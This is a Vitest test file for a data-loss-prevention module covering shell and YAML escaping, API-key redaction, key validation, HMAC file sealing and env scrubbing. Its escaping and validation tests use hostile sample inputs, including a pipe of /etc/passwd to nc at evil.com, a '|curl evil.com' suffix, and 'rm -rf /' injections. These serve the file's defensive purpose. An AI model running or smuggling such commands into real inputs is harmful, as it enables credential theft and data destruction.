import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import {
  yamlEscape,
  shellEscape,
  shellCommand,
  redact,
  redactError,
  DlpViolation,
  validateKeyValue,
  validateAllKeys,
  sealKeysFile,
  verifyKeysFile,
  audit,
  scrubEnv,
  zeroBuffer,
} from "../src/core/dlp.js";

// ─── YAML Escaping ──────────────────────────────────────────────────

describe("yamlEscape", () => {
  it("escapes backslashes", () => {
    expect(yamlEscape("a\\b")).toBe("a\\\\b");
  });

  it("escapes double quotes", () => {
    expect(yamlEscape('a"b')).toBe('a\\"b');
  });

  it("escapes newlines and carriage returns", () => {
    expect(yamlEscape("line1\nline2\rline3")).toBe("line1\\nline2\\rline3");
  });

  it("escapes tabs", () => {
    expect(yamlEscape("col1\tcol2")).toBe("col1\\tcol2");
  });

  it("strips null bytes", () => {
    expect(yamlEscape("abc\0def")).toBe("abcdef");
  });

  it("handles clean strings unchanged", () => {
    expect(yamlEscape("sk-ant-api03-abc123")).toBe("sk-ant-api03-abc123");
  });

  it("handles empty string", () => {
    expect(yamlEscape("")).toBe("");
  });

  it("prevents YAML multiline injection", () => {
    const attack = 'key: value\n  injected: true\n  another: "payload"';
    const escaped = yamlEscape(attack);
    expect(escaped).not.toContain("\n");
    expect(escaped).toContain("\\n");
  });
});

// ─── Shell Escaping ─────────────────────────────────────────────────

describe("shellEscape", () => {
  it("wraps simple strings in single quotes", () => {
    expect(shellEscape("hello")).toBe("'hello'");
  });

  it("escapes single quotes with the standard idiom", () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
  });

  it("handles empty string", () => {
    expect(shellEscape("")).toBe("''");
  });

  it("throws on null bytes", () => {
    expect(() => shellEscape("abc\0def")).toThrow(DlpViolation);
    expect(() => shellEscape("abc\0def")).toThrow("Null byte");
  });

  it("safely wraps shell metacharacters", () => {
    const dangerous = "$(rm -rf /)";
    const escaped = shellEscape(dangerous);
    expect(escaped).toBe("'$(rm -rf /)'");
  });

  it("handles backticks and pipes", () => {
    const dangerous = "`cat /etc/passwd` | nc evil.com 1234";
    const escaped = shellEscape(dangerous);
    expect(escaped).toBe("'`cat /etc/passwd` | nc evil.com 1234'");
  });
});

// ─── Shell Command Tagged Template ──────────────────────────────────

describe("shellCommand", () => {
  it("escapes interpolated values only", () => {
    const url = "https://example.trycloudflare.com";
    // Tagged template: \n in the template literal is a real newline character
    const result = shellCommand`printf '%s' ${url} > /tmp/file.txt`;
    expect(result).toBe("printf '%s' 'https://example.trycloudflare.com' > /tmp/file.txt");
  });

  it("escapes dangerous interpolated values", () => {
    const evil = "'; rm -rf / #";
    const result = shellCommand`echo ${evil}`;
    // The value is wrapped in single quotes with escaped inner quotes
    expect(result).toContain("'\\''");
    // The semicolon is inside single quotes so it's safe — the string contains it literally
    // but it won't be interpreted by the shell
    expect(result).toMatch(/^echo '/);
  });

  it("handles multiple interpolations", () => {
    const a = "file.txt";
    const b = "/tmp/out";
    const result = shellCommand`cp ${a} ${b}`;
    expect(result).toBe("cp 'file.txt' '/tmp/out'");
  });
});

// ─── Output Redaction ───────────────────────────────────────────────

describe("redact", () => {
  it("redacts Anthropic API keys", () => {
    const text = "Key is sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456";
    expect(redact(text)).toBe("Key is [REDACTED]");
  });

  it("redacts OpenAI API keys", () => {
    const text = "Key is sk-abcdefghijklmnopqrstuvwxyz";
    expect(redact(text)).toBe("Key is [REDACTED]");
  });

  it("redacts Google API keys", () => {
    const text = "Key is AIzaSyB1234567890abcdefghijklmnopqrstuv";
    expect(redact(text)).toBe("Key is [REDACTED]");
  });

  it("redacts multiple keys in one string", () => {
    const text = "anthropic=sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaa openai=sk-bbbbbbbbbbbbbbbbbbbbbb";
    const result = redact(text);
    expect(result).not.toContain("sk-ant-api03");
    expect(result).not.toContain("sk-bb");
    expect(result.match(/\[REDACTED\]/g)?.length).toBeGreaterThanOrEqual(2);
  });

  it("leaves clean text unchanged", () => {
    const text = "No secrets here, just normal output.";
    expect(redact(text)).toBe(text);
  });

  it("handles empty string", () => {
    expect(redact("")).toBe("");
  });
});

describe("redactError", () => {
  it("redacts Error message and stack", () => {
    const err = new Error("Failed with key sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456");
    const safe = redactError(err);
    expect(safe.message).not.toContain("sk-ant-api03");
    expect(safe.message).toContain("[REDACTED]");
    expect(safe).toBeInstanceOf(Error);
  });

  it("preserves error name", () => {
    const err = new TypeError("Bad key sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456");
    const safe = redactError(err);
    expect(safe.name).toBe("TypeError");
  });

  it("handles non-Error values", () => {
    const safe = redactError("string with sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456");
    expect(safe).toBeInstanceOf(Error);
    expect(safe.message).toContain("[REDACTED]");
  });

  it("never mutates the original error", () => {
    const original = new Error("sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456");
    const originalMsg = original.message;
    redactError(original);
    expect(original.message).toBe(originalMsg);
  });
});

// ─── DlpViolation ───────────────────────────────────────────────────

describe("DlpViolation", () => {
  it("is an Error subclass", () => {
    const v = new DlpViolation("test");
    expect(v).toBeInstanceOf(Error);
    expect(v).toBeInstanceOf(DlpViolation);
  });

  it("has correct name", () => {
    expect(new DlpViolation("test").name).toBe("DlpViolation");
  });
});

// ─── Key Validation ─────────────────────────────────────────────────

describe("validateKeyValue", () => {
  it("accepts valid Anthropic key", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abcdefghijklmnopqrstu")
    ).not.toThrow();
  });

  it("accepts valid OpenAI key", () => {
    expect(() =>
      validateKeyValue("OPENAI_API_KEY", "sk-abcdefghijklmnopqrstuvwxyz")
    ).not.toThrow();
  });

  it("accepts valid Google key", () => {
    expect(() =>
      validateKeyValue("GOOGLE_API_KEY", "AIzaSyBabcdefghijklmnopqrstuvwxyz012345")
    ).not.toThrow();
  });

  it("accepts valid master secret", () => {
    expect(() =>
      validateKeyValue("NEXUS_MASTER_SECRET", "abcdefghijklmnopqrstuvwxyz123456")
    ).not.toThrow();
  });

  it("rejects keys with newlines (YAML injection)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc\ndef")
    ).toThrow(DlpViolation);
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc\ndef")
    ).toThrow("not permitted");
  });

  it("rejects keys with single quotes (shell injection)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc'def")
    ).toThrow(DlpViolation);
  });

  it("rejects keys with backticks (command injection)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc`whoami`def")
    ).toThrow(DlpViolation);
  });

  it("rejects keys with dollar sign (variable expansion)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc${HOME}def")
    ).toThrow(DlpViolation);
  });

  it("rejects keys with semicolons (command chaining)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc;rm -rf /")
    ).toThrow(DlpViolation);
  });

  it("rejects keys with pipes (command piping)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-api03-abc|curl evil.com")
    ).toThrow(DlpViolation);
  });

  it("rejects too-short keys", () => {
    expect(() => validateKeyValue("ANTHROPIC_API_KEY", "short")).toThrow(
      "length out of expected range"
    );
  });

  it("rejects too-long keys (>256 chars)", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "sk-ant-" + "a".repeat(260))
    ).toThrow("length out of expected range");
  });

  it("rejects wrong format for known key types", () => {
    expect(() =>
      validateKeyValue("ANTHROPIC_API_KEY", "wrong-prefix-abcdefghijklmnopqrstu")
    ).toThrow("does not match the expected format");
  });

  it("never includes the key value in error messages", () => {
    const secret = "sk-ant-api03-abc\ndef";
    try {
      validateKeyValue("ANTHROPIC_API_KEY", secret);
    } catch (err) {
      expect((err as Error).message).not.toContain("sk-ant");
    }
  });

  it("allows unknown key names without format validation", () => {
    expect(() =>
      validateKeyValue("CUSTOM_KEY", "abcdefghijklmnopqrstuvwxyz")
    ).not.toThrow();
  });
});

describe("validateAllKeys", () => {
  it("returns empty array for all valid keys", () => {
    const result = validateAllKeys({
      ANTHROPIC_API_KEY: "sk-ant-api03-abcdefghijklmnopqrstu",
      NEXUS_MASTER_SECRET: "abcdefghijklmnopqrstuvwxyz123456",
    });
    expect(result).toEqual([]);
  });

  it("returns violation messages for invalid keys", () => {
    const result = validateAllKeys({
      ANTHROPIC_API_KEY: "sk-ant-api03-abc\ndef",
      OPENAI_API_KEY: "sk-validopenaikeyabcdefghijklm",
    });
    expect(result.length).toBe(1);
    expect(result[0]).toContain("ANTHROPIC_API_KEY");
  });

  it("skips undefined/empty values", () => {
    const result = validateAllKeys({
      ANTHROPIC_API_KEY: undefined,
      OPENAI_API_KEY: "",
    });
    expect(result).toEqual([]);
  });
});

// ─── HMAC File Integrity ────────────────────────────────────────────

describe("sealKeysFile / verifyKeysFile", () => {
  // NEXUS_HOME is resolved at import time from process.env.HOME
  // so we must use the real ~/.buildwithnexus directory
  const nexusHome = path.join(process.env.HOME || "~", ".buildwithnexus");
  const hmacPath = path.join(nexusHome, ".keys.hmac");
  let tmpDir: string;
  let keysPath: string;
  let originalHmac: string | null = null;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "dlp-test-"));
    keysPath = path.join(tmpDir, ".env.keys");
    // Back up existing HMAC if present
    fs.mkdirSync(nexusHome, { recursive: true });
    if (fs.existsSync(hmacPath)) {
      originalHmac = fs.readFileSync(hmacPath, "utf-8");
    }
  });

  afterEach(() => {
    // Restore original HMAC
    if (originalHmac !== null) {
      fs.writeFileSync(hmacPath, originalHmac);
    } else if (fs.existsSync(hmacPath)) {
      fs.unlinkSync(hmacPath);
    }
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("seal + verify round-trip succeeds", () => {
    fs.writeFileSync(keysPath, "ANTHROPIC_API_KEY=sk-ant-test123\n");
    sealKeysFile(keysPath, "master-secret-test");
    expect(verifyKeysFile(keysPath, "master-secret-test")).toBe(true);
  });

  it("verify detects tampered file", () => {
    fs.writeFileSync(keysPath, "ANTHROPIC_API_KEY=sk-ant-test123\n");
    sealKeysFile(keysPath, "master-secret-test");
    // Tamper with the file
    fs.writeFileSync(keysPath, "ANTHROPIC_API_KEY=sk-ant-TAMPERED\n");
    expect(verifyKeysFile(keysPath, "master-secret-test")).toBe(false);
  });

  it("verify returns true when neither keys nor seal exist (genuine first run)", () => {
    // Remove both files to simulate genuine first run
    if (fs.existsSync(keysPath)) fs.unlinkSync(keysPath);
    if (fs.existsSync(hmacPath)) fs.unlinkSync(hmacPath);
    expect(verifyKeysFile(keysPath, "any-secret")).toBe(true);
  });

  it("verify returns false when keys exist but seal is missing (tamper)", () => {
    fs.writeFileSync(keysPath, "ANTHROPIC_API_KEY=sk-ant-test123\n");
    if (fs.existsSync(hmacPath)) fs.unlinkSync(hmacPath);
    expect(verifyKeysFile(keysPath, "any-secret")).toBe(false);
  });
});

// ─── Audit Trail ────────────────────────────────────────────────────

describe("audit", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "dlp-audit-"));
    vi.stubEnv("HOME", tmpDir);
    // Create the expected directory
    fs.mkdirSync(path.join(tmpDir, ".buildwithnexus"), { recursive: true });
  });

  afterEach(() => {
    vi.unstubAllEnvs();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("never throws even when directory does not exist", () => {
    vi.stubEnv("HOME", "/nonexistent/path/that/does/not/exist");
    expect(() => audit("keys_saved", "test")).not.toThrow();
  });

  it("redacts secrets in audit detail", () => {
    audit("ssh_exec", "command with sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456");
    const logPath = path.join(tmpDir, ".buildwithnexus", "audit.log");
    if (fs.existsSync(logPath)) {
      const content = fs.readFileSync(logPath, "utf-8");
      expect(content).not.toContain("sk-ant-api03");
      expect(content).toContain("[REDACTED]");
    }
  });
});

// ─── Environment Scrubbing ──────────────────────────────────────────

describe("scrubEnv", () => {
  it("removes known secret keys", () => {
    process.env.ANTHROPIC_API_KEY = "sk-ant-test";
    process.env.OPENAI_API_KEY = "sk-test";
    process.env.GOOGLE_API_KEY = "AIzaTest";
    process.env.NEXUS_MASTER_SECRET = "master";

    const clean = scrubEnv();

    expect(clean.ANTHROPIC_API_KEY).toBeUndefined();
    expect(clean.OPENAI_API_KEY).toBeUndefined();
    expect(clean.GOOGLE_API_KEY).toBeUndefined();
    expect(clean.NEXUS_MASTER_SECRET).toBeUndefined();

    // Cleanup
    delete process.env.ANTHROPIC_API_KEY;
    delete process.env.OPENAI_API_KEY;
    delete process.env.GOOGLE_API_KEY;
    delete process.env.NEXUS_MASTER_SECRET;
  });

  it("preserves non-secret env vars", () => {
    process.env.PATH_TEST_DLP = "/usr/bin";
    const clean = scrubEnv();
    expect(clean.PATH_TEST_DLP).toBe("/usr/bin");
    delete process.env.PATH_TEST_DLP;
  });

  it("scrubs unknown keys whose values match secret patterns", () => {
    process.env.MY_CUSTOM_VAR = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456";
    const clean = scrubEnv();
    expect(clean.MY_CUSTOM_VAR).toBeUndefined();
    delete process.env.MY_CUSTOM_VAR;
  });

  it("returns a copy, not a reference to process.env", () => {
    const clean = scrubEnv();
    clean.NEW_VAR = "test";
    expect(process.env.NEW_VAR).toBeUndefined();
    delete clean.NEW_VAR;
  });
});

// ─── Memory Safety ──────────────────────────────────────────────────

describe("zeroBuffer", () => {
  it("fills buffer with zeros", () => {
    const buf = Buffer.from("secret-data-here");
    zeroBuffer(buf);
    expect(buf.every((b) => b === 0)).toBe(true);
  });

  it("returns the same buffer", () => {
    const buf = Buffer.from("test");
    expect(zeroBuffer(buf)).toBe(buf);
  });

  it("handles empty buffer", () => {
    const buf = Buffer.alloc(0);
    expect(() => zeroBuffer(buf)).not.toThrow();
  });
});
